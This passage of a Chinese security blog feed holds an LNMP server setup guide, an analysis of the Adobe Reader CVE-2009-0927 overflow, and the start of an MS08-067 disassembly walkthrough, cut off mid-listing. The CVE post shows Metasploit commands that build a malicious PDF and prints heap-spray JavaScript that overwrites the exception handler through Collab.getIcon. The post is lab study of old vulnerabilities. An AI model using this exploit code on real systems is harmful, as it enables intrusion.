    
    <category term="CTF" scheme="https://www.rgzzplus.com/categories/CTF/"/>
    
    
    <category term="攻防世界" scheme="https://www.rgzzplus.com/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/"/>
    
    <category term="reverse" scheme="https://www.rgzzplus.com/tags/reverse/"/>
    
  </entry>
  
  <entry>
    <title>安装LNMP</title>
    <link href="https://www.rgzzplus.com/2022/07/22/%E5%AE%89%E8%A3%85LNMP/"/>
    <id>https://www.rgzzplus.com/2022/07/22/%E5%AE%89%E8%A3%85LNMP/</id>
    <published>2022-07-22T00:19:12.000Z</published>
    <updated>2022-08-01T10:29:15.528Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="开启端口"><a class="markdownIt-Anchor" href="#开启端口"></a> 开启端口</h1><p>服务器：22，80，3389</p><h1 id="lnmp-是什么"><a class="markdownIt-Anchor" href="#lnmp-是什么"></a> LNMP 是什么？</h1><p>Linux  Nginx  MySQL  PHP</p><h1 id="安装-lnmp"><a class="markdownIt-Anchor" href="#安装-lnmp"></a> 安装 LNMP</h1><p>安装 screen：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install screen</span><br></pre></td></tr></table></figure><p>安装时会出现提问，都填 y</p><p>接着输入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">screen -S lnmp</span><br></pre></td></tr></table></figure><p>继续输入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://soft.vpser.net/lnmp/lnmp1.6.tar.gz -cO lnmp1.6.tar.gz &amp;&amp; tar zxf lnmp1.6.tar.gz &amp;&amp; cd lnmp1.6 &amp;&amp; ./install.sh lnmp</span><br></pre></td></tr></table></figure><p>之后会选选项，都选默认（Default）</p><p>等待安装完成后，按下Ctrl+C 退出。</p><p><img src="/2022/07/22/%E5%AE%89%E8%A3%85LNMP/image-20220722010005501.png" alt="image-20220722010005501"></p><p>现在打开浏览器，输入[服务器地址]/p.php</p><p><img src="/2022/07/22/%E5%AE%89%E8%A3%85LNMP/image-20220722011725678.png" alt="image-20220722011725678"></p><p>现在把你的域名解析到该服务器，以阿里云为例。</p><blockquote><p>注意：这里我是为了测试主机能否启用，所以用内网ip进行解析，如果您需要外网访问，请用公网ip，百度 ‘ip’ 就能看到主机IP地址。</p></blockquote><img src="/2022/07/22/%E5%AE%89%E8%A3%85LNMP/image-20220722010346358.png" alt="image-20220722010346358" style="zoom:50%;"><p>接下来，在主机上绑定域名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lnmp vhost add</span><br></pre></td></tr></table></figure><p>输入你的域名：<a href="http://test.rgzzplus.com">test.rgzzplus.com</a></p><p>接下来是问你是否需要继续解析，不用就直接回车</p><p>然后是设置文件路径，回车默认</p><p>之后的按需选择 y/n</p><p><img src="/2022/07/22/%E5%AE%89%E8%A3%85LNMP/image-20220722011100668.png" alt="image-20220722011100668"></p><p>现在，来到刚刚的默认文件路径</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd /home/wwwroot/test.rgzzplus.com/</span><br></pre></td></tr></table></figure><p>ls 后发现是空文件夹，接着就是存放我们的网站文件了</p><p>我这里直接使用小甲鱼老师提供的简历网站</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://test-fishc.oss-cn-hangzhou.aliyuncs.com/HWC/resume.zip</span><br></pre></td></tr></table></figure><p>下载完后，解压文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unzip resume.zip</span><br></pre></td></tr></table></figure><p>接下来，输入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chown www:www -R /home/wwwroot/test.rgzzplus.com/</span><br></pre></td></tr></table></figure><p>接着就能打开浏览器，查看网站了</p><p><img src="/2022/07/22/%E5%AE%89%E8%A3%85LNMP/image-20220722011559834.png" alt="image-20220722011559834"></p><img src="https://xxx.ilovefishc.com/forum/202003/03/122025sepn4rlfmrmpv8pf.png" alt="img"><blockquote><p>参考资料</p><p>​<a href="https://www.bilibili.com/video/BV1VE41147jU?p=1&amp;t=11&amp;vd_source=2fef7d81c913d5bf46b142b80676c5ec">【后端开发】10分钟教你从0搭建一台专属“云服务器”</a></p><p>​<a href="https://fishc.com.cn/forum.php?mod=forumdisplay&amp;fid=171&amp;filter=typeid&amp;typeid=301">【技术交流】<strong>小甲鱼10分钟教你从0搭建一台服务器</strong></a></p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[TOC]&lt;/p&gt;
&lt;h1 id=&quot;开启端口&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#开启端口&quot;&gt;&lt;/a&gt; 开启端口&lt;/h1&gt;
&lt;p&gt;服务器：22，80，3389&lt;/p&gt;
&lt;h1 id=&quot;lnmp-是什么&quot;&gt;&lt;a class=&quot;markdo</summary>
      
    
    
    
    <category term="工具" scheme="https://www.rgzzplus.com/categories/%E5%B7%A5%E5%85%B7/"/>
    
    
    <category term="LNMP" scheme="https://www.rgzzplus.com/tags/LNMP/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2009-0927：PDF中的JS</title>
    <link href="https://www.rgzzplus.com/2022/07/22/CVE-2009-0927%EF%BC%9APDF%E4%B8%AD%E7%9A%84JS/"/>
    <id>https://www.rgzzplus.com/2022/07/22/CVE-2009-0927%EF%BC%9APDF%E4%B8%AD%E7%9A%84JS/</id>
    <published>2022-07-22T00:16:24.000Z</published>
    <updated>2022-08-01T11:18:00.649Z</updated>
    
    <content type="html"><![CDATA[<p>[toc]</p><h1 id="cve-2009-0927-简介"><a class="markdownIt-Anchor" href="#cve-2009-0927-简介"></a> CVE-2009-0927 简介</h1><p>Adobe Reader 是非常流行的 PDF 文件阅读器，在其 Collab 对象的 getIcon() 函数中存在一个缓冲区溢出漏洞。同时由于 PDF 文档中支持内嵌的 JavaScript，攻击者可以通过在 PDF 文档中植入恶意的 JavaScript 来向 getIcon()函数传递特制的参数以触发溢出漏洞， 并结合 Heap Spray 攻击来夺取计算机的控制权。</p><blockquote><p>Heap Spray：通过申请大量空间，来让程序命中，从而执行 shellcode</p></blockquote><h1 id="pdf-文档格式简介"><a class="markdownIt-Anchor" href="#pdf-文档格式简介"></a> PDF 文档格式简介</h1><p>PDF 文档是一种文本和二进制混排的格式，它由四部分构成。</p><ul><li>header：头部，标识 PDF 文档的版本。</li><li>body：主体，包含 PDF 文档的主体内容，各部分以对象方式呈现。</li><li>cross－reference：交叉引用表，通过交叉引用表可以快速的找到 PDF 文档中的各对象。</li><li>trailer：尾部，包含交叉引用的摘要和交叉引用表的起始位置。</li></ul><p>请新建一个 PDF 文档，用普通文本编辑器打开，参阅下边的格式注释来理解文件格式。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line">%<span class="variable constant_">PDF</span>-<span class="number">1.1</span> <span class="comment">//头部，说明次 PDF 文档符合 PDF1.1 规范</span></span><br><span class="line"></span><br><span class="line"><span class="number">1</span> <span class="number">0</span> obj</span><br><span class="line">&lt;&lt;</span><br><span class="line">    <span class="regexp">/Type /</span><span class="title class_">Catalog</span> <span class="comment">//说明这个 obj 是 Catalog 对象</span></span><br><span class="line">    /<span class="title class_">Outlines</span> <span class="number">2</span> <span class="number">0</span> R <span class="comment">//第二个 obj 是 Outlines</span></span><br><span class="line">    /<span class="title class_">Pages</span> <span class="number">3</span> <span class="number">0</span> R <span class="comment">//第三个 obj 是 Pages</span></span><br><span class="line">    /<span class="title class_">OpenAction</span> <span class="number">7</span> <span class="number">0</span> R <span class="comment">//第七个 obj 是 OpenAction，听这个名字大家也应该能感觉到有点料，文件打开时会执行它里边的脚本</span></span><br><span class="line">&gt;&gt;</span><br><span class="line">endobj</span><br><span class="line"></span><br><span class="line"><span class="number">2</span> <span class="number">0</span> obj</span><br><span class="line">&lt;&lt;</span><br><span class="line">    <span class="regexp">/Type /</span><span class="title class_">Outlines</span></span><br><span class="line">    /<span class="title class_">Count</span> <span class="number">0</span> <span class="comment">//0 表示没有书签</span></span><br><span class="line">&gt;&gt;</span><br><span class="line">endobj</span><br><span class="line"></span><br><span class="line"><span class="number">3</span> <span class="number">0</span> obj</span><br><span class="line">&lt;&lt;</span><br><span class="line">    <span class="regexp">/Type /</span><span class="title class_">Pages</span></span><br><span class="line">    /<span class="title class_">Kids</span> [<span class="number">4</span> <span class="number">0</span> R] <span class="comment">//说明它的孩子、页的对象号为 4</span></span><br><span class="line">    /<span class="title class_">Count</span> <span class="number">1</span> <span class="comment">//说明页码数量为 1</span></span><br><span class="line">&gt;&gt;</span><br><span class="line">endobj</span><br><span class="line"></span><br><span class="line"><span class="number">4</span> <span class="number">0</span> obj</span><br><span class="line">&lt;&lt;</span><br><span class="line">    <span class="regexp">/Type /</span><span class="title class_">Page</span></span><br><span class="line">    /<span class="title class_">Parent</span> <span class="number">3</span> <span class="number">0</span> R <span class="comment">//其父对象的对象号为 3</span></span><br><span class="line">    /<span class="title class_">MediaBox</span> [<span class="number">0</span> <span class="number">0</span> <span class="number">612</span> <span class="number">792</span>] <span class="comment">//页面的显示大小，以象素为单位</span></span><br><span class="line">    /<span class="title class_">Contents</span> <span class="number">5</span> <span class="number">0</span> R <span class="comment">//内容对象的对象号为 5</span></span><br><span class="line">    /<span class="title class_">Resources</span> &lt;&lt; <span class="comment">//说明该页所要包含的资源，包括字体和内容的类型</span></span><br><span class="line">                <span class="regexp">/ProcSet [/PDF /Text]</span></span><br><span class="line"><span class="regexp">                /</span><span class="title class_">Font</span> &lt;&lt; /<span class="variable constant_">F1</span> <span class="number">6</span> <span class="number">0</span> R &gt;&gt;</span><br><span class="line">&gt;&gt;</span><br><span class="line">&gt;&gt;</span><br><span class="line">endobj</span><br><span class="line"></span><br><span class="line"><span class="number">5</span> <span class="number">0</span> obj</span><br><span class="line">&lt;&lt; <span class="regexp">/Length 98 &gt;&gt; /</span><span class="regexp">/stream 对象为字节数，从 BT 开始， ET 结束，包括中间的行结束符</span></span><br><span class="line"><span class="regexp">stream /</span><span class="regexp">/流对象开始</span></span><br><span class="line"><span class="regexp">BT /</span><span class="variable constant_">F1</span> <span class="number">12</span> <span class="title class_">Tf</span> <span class="number">100</span> <span class="number">700</span> <span class="title class_">Td</span> <span class="number">15</span> <span class="variable constant_">TL</span> (<span class="title class_">Open</span> <span class="title class_">File</span> <span class="title class_">Error</span>! <span class="title class_">Maybe</span> the file is damaged! <span class="comment">//文本位置和内容</span></span><br><span class="line">) <span class="title class_">Tj</span> <span class="variable constant_">ET</span></span><br><span class="line">endstream <span class="comment">//流对象结束</span></span><br><span class="line">endobj</span><br><span class="line"></span><br><span class="line"><span class="number">6</span> <span class="number">0</span> obj</span><br><span class="line">&lt;&lt;</span><br><span class="line">    <span class="regexp">/Type /</span><span class="title class_">Font</span> <span class="comment">//字体对象</span></span><br><span class="line">    /<span class="title class_">Subtype</span> /<span class="title class_">Type1</span></span><br><span class="line">    /<span class="title class_">Name</span> /<span class="variable constant_">F1</span></span><br><span class="line">    /<span class="title class_">BaseFont</span> /<span class="title class_">Helvetica</span></span><br><span class="line">    /<span class="title class_">Encoding</span> /<span class="title class_">MacRomanEncoding</span></span><br><span class="line">&gt;&gt;</span><br><span class="line">endobj</span><br><span class="line"></span><br><span class="line"><span class="number">7</span> <span class="number">0</span> obj</span><br><span class="line">&lt;&lt;</span><br><span class="line">    <span class="regexp">/Type /</span><span class="title class_">Action</span></span><br><span class="line">    /S /<span class="title class_">JavaScript</span></span><br><span class="line">    /<span class="variable constant_">JS</span> ( <span class="comment">//可以放置 JavaScript 脚本，关键部分噢</span></span><br><span class="line">   </span><br><span class="line">   )</span><br><span class="line">&gt;&gt;</span><br><span class="line">endobj</span><br><span class="line"></span><br><span class="line">xref <span class="comment">//交叉引用表</span></span><br><span class="line"><span class="number">0</span> <span class="number">8</span> <span class="comment">//说明下面的描述是从 0 号对象开始，数量为 8</span></span><br><span class="line"><span class="number">0000000000</span> <span class="number">65535</span> f <span class="comment">//一般每个 PDF 文件都是以这一行开始交叉应用表的，说明对象 0 的起始地址为 0000000000，产生号（generation number）为 65535，也是最大产生号，不可以再进行更改，而且最后对象的表示是 f, 表明该对象为 free</span></span><br><span class="line"><span class="number">0000000010</span> <span class="number">00000</span> n <span class="comment">//表示对象 1， 也就是 catalog 对象了，0000000009 是其偏移地址，00000 为 5 位产生号，全 0 表明该对象未被修改过， n 表示该对象在使用。</span></span><br><span class="line"><span class="number">0000000098</span> <span class="number">00000</span> n</span><br><span class="line"><span class="number">0000000147</span> <span class="number">00000</span> n</span><br><span class="line"><span class="number">0000000208</span> <span class="number">00000</span> n</span><br><span class="line"><span class="number">0000000400</span> <span class="number">00000</span> n</span><br><span class="line"><span class="number">0000000549</span> <span class="number">00000</span> n</span><br><span class="line"><span class="number">0000000663</span> <span class="number">00000</span> n</span><br><span class="line"></span><br><span class="line">trailer <span class="comment">//尾部</span></span><br><span class="line">&lt;&lt;</span><br><span class="line">    <span class="regexp">/Size 8 /</span><span class="regexp">/该 PDF 对象数</span></span><br><span class="line"><span class="regexp">    /</span><span class="title class_">Root</span> <span class="number">1</span> <span class="number">0</span> R <span class="comment">//根对象的对象号为 1</span></span><br><span class="line">&gt;&gt;</span><br><span class="line">startxref</span><br><span class="line"><span class="number">1946</span> <span class="comment">//交叉引用表的偏移地址</span></span><br><span class="line">%%<span class="variable constant_">EOF</span> <span class="comment">//文件结束标志</span></span><br></pre></td></tr></table></figure><h1 id="漏洞原理及利用分析"><a class="markdownIt-Anchor" href="#漏洞原理及利用分析"></a> 漏洞原理及利用分析</h1><h2 id="实验环境"><a class="markdownIt-Anchor" href="#实验环境"></a> 实验环境</h2><table><thead><tr><th></th><th>推荐使用的环境</th><th>备 注</th></tr></thead><tbody><tr><td>操作系统</td><td>Windows XP SP3</td><td>建议在虚拟机 VMware 7.0 中运行</td></tr><tr><td>Adobe Reader 版本</td><td>9.0 中文版</td><td></td></tr></tbody></table><h2 id="漏洞分析"><a class="markdownIt-Anchor" href="#漏洞分析"></a> 漏洞分析</h2><p>PDF 文件一旦被打开就会执行 OpenAction 对象里的脚本，所以只要在 OpenAction 对象中精心构造 JS 脚本，就能实现对 Adobe Reader 的攻击。</p><p>首先在 kali 中用 msf 生成样本，具体如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&gt; msf5 &gt; search cve-<span class="number">2009</span>-0927</span><br><span class="line"></span><br><span class="line">&gt; exploit/windows/browser/adobe_geticon     <span class="number">2009</span>-03-<span class="number">24</span>       good  No     Adobe Collab.getIcon() Buffer Overflow</span><br><span class="line">&gt; exploit/windows/fileformat/adobe_geticon  <span class="number">2009</span>-03-<span class="number">24</span>       good  No     Adobe Collab.getIcon() Buffer Overflow</span><br><span class="line"></span><br><span class="line">&gt; msf5 &gt; use exploit/windows/fileformat/adobe_geticon</span><br><span class="line">&gt; msf5 exploit(windows/fileformat/adobe_geticon) &gt; <span class="built_in">set</span> payload windows/<span class="built_in">exec</span></span><br><span class="line">&gt; payload =&gt; windows/<span class="built_in">exec</span></span><br><span class="line">&gt; msf5 exploit(windows/fileformat/adobe_geticon) &gt; <span class="built_in">set</span> cmd calc.exe</span><br><span class="line">&gt; cmd =&gt; calc.exe</span><br><span class="line">&gt; msf5 exploit(windows/fileformat/adobe_geticon) &gt; run</span><br></pre></td></tr></table></figure><p>生成样本以后，运行一下成功弹出计算器，之后我们用<code>PDFStreamDump</code>打开，在对象5处可以看到样本中包含的payload，dump下来之后，发现payload中的js用了超长变量名，不利于阅读代码，把变量名替换以后，得到如下可读代码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> shellcode = <span class="built_in">unescape</span>(<span class="string">&quot;%u4096%ud6f9%u9147%ufd98%ufd9b%uf840%u9047......&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> nopblock = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line"># 布置堆的内容</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">128</span>; i &gt;= <span class="number">0</span>; --i) </span><br><span class="line">&#123;</span><br><span class="line">    nopblock += <span class="built_in">unescape</span>(<span class="string">&quot;%u9090%u9090&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">buff = nopblock + shellcode;</span><br><span class="line">nop = <span class="built_in">unescape</span>(<span class="string">&quot;%u9090%u9090&quot;</span>);</span><br><span class="line">headersize = <span class="number">20</span>;</span><br><span class="line">acl = headersize + buff.<span class="property">length</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (nop.<span class="property">length</span> &lt; acl) </span><br><span class="line">&#123;</span><br><span class="line">    nop += nop;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fillblock = nop.<span class="title function_">substring</span>(<span class="number">0</span>, acl);</span><br><span class="line">block = nop.<span class="title function_">substring</span>(<span class="number">0</span>, nop.<span class="property">length</span> - acl);</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (block.<span class="property">length</span> + acl &lt; <span class="number">0x40000</span>)</span><br><span class="line">&#123;</span><br><span class="line">    block = block + block + fillblock;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">memory = <span class="keyword">new</span> <span class="title class_">Array</span>();</span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="number">1450</span>; j++)</span><br><span class="line">&#123;</span><br><span class="line">    memory[j] = block + buff;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 用<span class="number">0x0a0a0a0a</span>占领<span class="variable constant_">SEH</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> ret_addr = <span class="built_in">unescape</span>(<span class="string">&quot;%0a&quot;</span>);</span><br><span class="line"><span class="keyword">while</span> (ret_addr.<span class="property">length</span> &lt; <span class="number">0x4000</span>)</span><br><span class="line">&#123;</span><br><span class="line">    ret_addr += ret_addr;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">ret_addr = <span class="string">&quot;N.&quot;</span> + ret_addr; <span class="comment">//注意这里的 N.</span></span><br><span class="line"><span class="title class_">Collab</span>.<span class="title function_">getIcon</span>(ret_addr);</span><br></pre></td></tr></table></figure><p>首先用 OllyDbg 加载 Adobe Reader，待其启动完成后通过 Adobe Reader 的菜单打开 POC 文档， OllyDbg 会因为一个写入异常而中断。</p><p><img src="/2022/07/22/CVE-2009-0927%EF%BC%9APDF%E4%B8%AD%E7%9A%84JS/image-20220721154949364.png" alt="image-20220721154949364"></p><p>从上图中可以看到，程序在向 0x00130000 位置写入数据时发生异常，因为 0x00130000 这个地址已经超出程序的栈空间范围，一般是由于复制了超长字符串所致。</p><p>同时栈顶的 strncpy 也印证了我们的猜想，问题可能出现在这里，不妨进入 0x2210FE4E 区域看看。</p><p><img src="/2022/07/22/CVE-2009-0927%EF%BC%9APDF%E4%B8%AD%E7%9A%84JS/image-20220721161909784.png" alt="image-20220721161909784"></p><p>发现在 0x2210FE25 处的 <code>call edi</code> 指令调用了 strncpy 函数，着应该就是溢出根源了。但是 strncpy 函数限制了复制字符串长度，为什么还会溢出呢？继续向上看，原来上面将源字符串长度作为了复制字符串长度，这就相当于执行了 strcpy，当源字符串长度大于目标缓冲区长度时就会发生溢出。</p><h2 id="利用分析"><a class="markdownIt-Anchor" href="#利用分析"></a> 利用分析</h2><p>漏洞原理清楚后，我们就要考虑如何利用这个漏洞了，这里我们可以选择覆盖函数的返回地址或者覆盖程序的异常处理函数指针，我们选择后者。</p><p><img src="/2022/07/22/CVE-2009-0927%EF%BC%9APDF%E4%B8%AD%E7%9A%84JS/image-20220721163130184.png" alt="image-20220721163130184"></p><p>回顾一下 exploit 的思路：通过 Heap Spray 技术占领内存中的 0x0C0C0C0C 位置，然后再向 getIcon()函数传递超长字符串来覆盖程序的异常处理函数指针；同时这个超长字符串还有一个使命就是触发异常——当这个字符串足够长的时候（超出当前堆栈范围）就会触发写入异常，程序因此转入已被篡改了的异常处理函数，最终执行 shellcode。</p><p>最后，计算器也弹了出来：</p><p><img src="/2022/07/22/CVE-2009-0927%EF%BC%9APDF%E4%B8%AD%E7%9A%84JS/image-20220721163229851.png" alt="image-20220721163229851"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[toc]&lt;/p&gt;
&lt;h1 id=&quot;cve-2009-0927-简介&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#cve-2009-0927-简介&quot;&gt;&lt;/a&gt; CVE-2009-0927 简介&lt;/h1&gt;
&lt;p&gt;Adobe Reader 是非常流</summary>
      
    
    
    
    <category term="0day安全" scheme="https://www.rgzzplus.com/categories/0day%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="漏洞" scheme="https://www.rgzzplus.com/tags/%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>RPC入侵：MS08-067</title>
    <link href="https://www.rgzzplus.com/2022/07/20/RPC%E5%85%A5%E4%BE%B5%EF%BC%9AMS08-067/"/>
    <id>https://www.rgzzplus.com/2022/07/20/RPC%E5%85%A5%E4%BE%B5%EF%BC%9AMS08-067/</id>
    <published>2022-07-20T08:15:17.000Z</published>
    <updated>2022-08-01T11:20:03.340Z</updated>
    
    <content type="html"><![CDATA[<p>[toc]</p><h1 id="ms08-067-简介"><a class="markdownIt-Anchor" href="#ms08-067-简介"></a> MS08-067 简介</h1><p>MS08-067 漏洞是由于 netapi32.dll 的导出函数 NetpwPathCanonicalize 在处理字符串时出现了错误，从而导致栈溢出，并且影响的操作系统范围很广，包括引入了 GS 安全机制的 Windows XP SP2、 Vista 以及 Windows 7。</p><p>MS08-067 的溢出发生在 NetpwPathCannonicalize 函数的子函数 CanonicalizePathName 中。当路径合并至临时的栈空间 Buff_OF 后， CanonicalizePathName 函数并不是直接将其复制到输出参数 can_path 中，而是要对 Buff_OF 串做以下三步操作，以对路径规范化。</p><p>1）将合并路径中的所有的 slash 字符‘ /’（ 0x2F）转化为 backslash 字符‘ \’（ 0x5C）。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">5FDDA1F0 lea eax, [ebp+Buff_OF]</span><br><span class="line">5FDDA1F6 jz short @@chk_dos_path_type</span><br><span class="line">5FDDA1F8 @@replace_slash_loop:</span><br><span class="line">5FDDA1F8 cmp word ptr [eax], &#x27;/&#x27;</span><br><span class="line">5FDDA1FC jz @@slash_to_back_slash</span><br><span class="line">5FDDA202 @@slash_to_back_forward:</span><br><span class="line">5FDDA202 inc eax</span><br><span class="line">5FDDA203 inc eax</span><br><span class="line">5FDDA204 cmp word ptr [eax], 0</span><br><span class="line">5FDDA208 jnz short @@replace_slash_loop</span><br><span class="line">...</span><br><span class="line">5FDE88EF @@slash_to_back_slash:</span><br><span class="line">5FDE88EF mov word ptr [eax], &#x27;\&#x27;</span><br><span class="line">5FDE88F4 jmp @@slash_to_back_forward</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>2）调用子函数 CheckDosPathType，检查合并路径的 DOS 路径类型，由于与溢出无关，不用深究其原理，我们只需了解这个函数的返回值，如果返回0，代码即将进入产生溢出的函数。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">5FDDA20A @@chk_dos_path_type:</span><br><span class="line">5FDDA20A lea eax, [ebp+Buff_OF]</span><br><span class="line">5FDDA210 call CheckDosPathType</span><br><span class="line">5FDDA215 test eax, eax</span><br><span class="line">5FDDA217 jnz short @@chk_buf_of_len</span><br><span class="line">5FDDA219 lea eax, [ebp+Buff_OF]</span><br><span class="line">5FDDA21F push eax</span><br><span class="line">5FDDA220 call RemoveLegarcyFolder;溢出函数</span><br><span class="line">5FDDA225 test eax, eax</span><br><span class="line">5FDDA227 jz short @@err_invalid_name</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>3）溢出就发生在子函数 RemoveLegacyFolder 中； RemoveLegacyFolder 返回后，如果返回非零，表示合并路径已符合要求，若其长度未超过 maxbuf，即可复制至 can_path 中。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">5FDDA229 @@chk_buf_of_len:</span><br><span class="line">5FDDA229 lea eax, [ebp+Buff_OF]</span><br><span class="line">5FDDA22F push eax</span><br><span class="line">5FDDA230 call esi ; __imp_wcslen</span><br><span class="line">5FDDA232 lea eax, [eax+eax+2]</span><br><span class="line">5FDDA236 cmp eax, [ebp+arg_MaxBuf]</span><br><span class="line">5FDDA239 pop ecx</span><br><span class="line">5FDDA23A ja @@chk_retsize</span><br><span class="line">5FDDA240 lea eax, [ebp+Buff_OF]</span><br><span class="line">5FDDA246 push eax ; 